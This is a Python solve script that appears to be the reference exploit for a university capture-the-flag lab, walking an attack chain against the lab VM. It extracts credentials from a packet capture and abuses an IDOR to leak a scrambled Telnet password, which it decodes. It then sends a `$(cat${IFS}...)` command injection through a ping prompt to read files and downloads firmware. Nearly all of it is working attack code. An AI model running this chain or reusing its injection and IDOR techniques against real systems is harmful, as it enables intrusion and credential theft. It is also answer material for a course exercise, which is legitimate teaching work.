#!/usr/bin/env python3
"""
Reference exploit for MY full route (network -> horizontal PE -> network).
Runs against the live services; a backup for the demo if I don't want to click
through it by hand.

  step 1  read capture.pcap -> operator credential (the 200 login)
  step 2  log into the console, IDOR to NetOps #48879 -> Telnet backdoor (scrambled)
  step 3  telnet in, ping ${IFS}/$() injection -> router flag + firmware URL,
          then download the firmware (Isaac's RE binary)

Usage:
  python3 solve.py <vm-ip>                       # console:8090, telnet:23
  python3 solve.py <vm-ip> --console-port 8090 --telnet-port 23 --pcap capture.pcap
"""
import argparse
import base64
import os
import re
import socket
import time
import urllib.parse
import urllib.request


def creds_from_pcap(path):
    from scapy.all import Raw, TCP, rdpcap
    tok, status = {}, {}
    for p in rdpcap(path):
        if not (p.haslayer(TCP) and p.haslayer(Raw)):
            continue
        data, t = bytes(p[Raw].load), p[TCP]
        if t.dport == 80:
            m = re.search(rb"X-Aero-Session: (\S+)", data)
            if m:
                tok[t.sport] = m.group(1).decode()
        elif t.sport == 80:
            m = re.search(rb"HTTP/1\.1 (\d{3})", data)
            if m:
                status.setdefault(t.dport, int(m.group(1)))
    for s, tk in tok.items():
        if status.get(s) == 200:
            import json
            d = json.loads(base64.b64decode(tk))     # token is base64(JSON)
            return d["u"], d["p"]
    raise SystemExit("[!] no 200 session found in pcap")


def console_idor(base, user, code):
    import http.cookiejar
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    data = urllib.parse.urlencode({"operator": user, "code": code}).encode()
    op.open(base + "/login", data=data).read()                  # log in (sets cookie)
    encid = lambda n: str(n).encode().hex()                     # record-id encoding
    # decode my own id (4022) to learn the scheme, then IDOR to a neighbour's
    # record (4023) that was never listed for me -> it names the config record.
    crumb = op.open(f"{base}/document/{encid(4023)}").read().decode(errors="replace")
    target = int(re.search(r"record\s*#(\d+)", crumb, re.I).group(1))  # e.g. 48879
    body = op.open(f"{base}/document/{encid(target)}").read().decode(errors="replace")
    if "mgmt.telnet.pass_enc" in body:                          # IDOR (no ownership check)
        u = re.search(r"mgmt\.telnet\.user\s*=\s*(\S+)", body).group(1)
        enc = re.search(r"mgmt\.telnet\.pass_enc\s*=\s*(\S+)", body).group(1)
        pw = "".join(chr(b ^ 0x5A) for b in base64.b64decode(enc))
        print(f"[+] IDOR: record {encid(target)} (#{target}) leaked router config -> {u}:{pw}")
        return u, pw
    raise SystemExit("[!] never found the config via IDOR")


def _ping_read(s, rd, path):
    """Read one file via the ping ${IFS}/$() injection; return the echoed token."""
    s.sendall(f"ping $(cat${{IFS}}{path})\r\n".encode())
    out = rd()
    # ping echoes the unresolved value as: ping: <value>: Name or service not known
    m = re.search(r"ping:\s*(\S+):", out)
    return (m.group(1) if m else ""), out


def telnet_inject(ip, port, user, pw):
    s = socket.socket(); s.settimeout(6); s.connect((ip, port))
    def rd():
        time.sleep(0.4)
        try: return s.recv(8192).decode(errors="replace")
        except Exception: return ""
    rd()
    s.sendall(user.encode() + b"\r\n"); rd()
    s.sendall(pw.encode() + b"\r\n"); rd()
    # /opt/maint/rtr-01.snapshot holds the flag AND the firmware URL joined in one
    # token, so a single read hands us both (that's how a player can't miss the fw).
    _, out = _ping_read(s, rd, "/opt/maint/rtr-01.snapshot")
    s.sendall(b"exit\r\n"); s.close()
    mflag = re.search(r"CITS3006\{[^}]+\}", out)
    murl = re.search(r"http://\S+?acc-rtr01-fw\.elf", out)
    flag = mflag.group(0) if mflag else ""
    fw_url = murl.group(0) if murl else ""
    return flag, out, fw_url


def fetch_firmware(ip, fw_url, out_path="acc-rtr01-fw.elf"):
    """Download the firmware (Isaac's RE binary) from the secret URL."""
    # the router writes ROUTER-HOST as a placeholder -> use the address we reached
    url = fw_url.replace("ROUTER-HOST", ip)
    try:
        data = urllib.request.urlopen(url, timeout=10).read()
    except Exception as e:
        print(f"[!] firmware download failed ({e})"); return None
    with open(out_path, "wb") as f:
        f.write(data)
    is_elf = data[:4] == b"\x7fELF"
    print(f"[+] downloaded firmware {url} -> {out_path} "
          f"({len(data)} bytes, {'ELF' if is_elf else 'NOT elf?!'})")
    return out_path


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("target")
    ap.add_argument("--console-port", type=int, default=8090)
    ap.add_argument("--telnet-port", type=int, default=23)
    ap.add_argument("--pcap", default=os.path.join(
        os.path.dirname(__file__), "step1-packet-capture", "capture.pcap"))
    a = ap.parse_args()

    print(f"[*] target {a.target}\n[*] step 1: reading {a.pcap}")
    user, code = creds_from_pcap(a.pcap)
    print(f"[+] operator credential from pcap: {user}:{code}")
    print("[*] step 2: console login + IDOR")
    tuser, tpw = console_idor(f"http://{a.target}:{a.console_port}", user, code)
    print("[*] step 3: telnet command injection")
    flag, flag_out, fw_url = telnet_inject(a.target, a.telnet_port, tuser, tpw)
    m = re.search(r"CITS3006\{[^}]+\}", flag or flag_out)
    print("[+] ROUTER FLAG:", m.group(0) if m else f"(not found)\n{flag_out}")
    if fw_url:
        print(f"[+] firmware URL (RE binary): {fw_url}")
        print("[*] step 3b: download the firmware (hands off to the RE stage)")
        fetch_firmware(a.target, fw_url)
    print("\n[i] next: reverse the firmware -> SSH creds -> vertical privesc (step 4/5)")


if __name__ == "__main__":
    main()
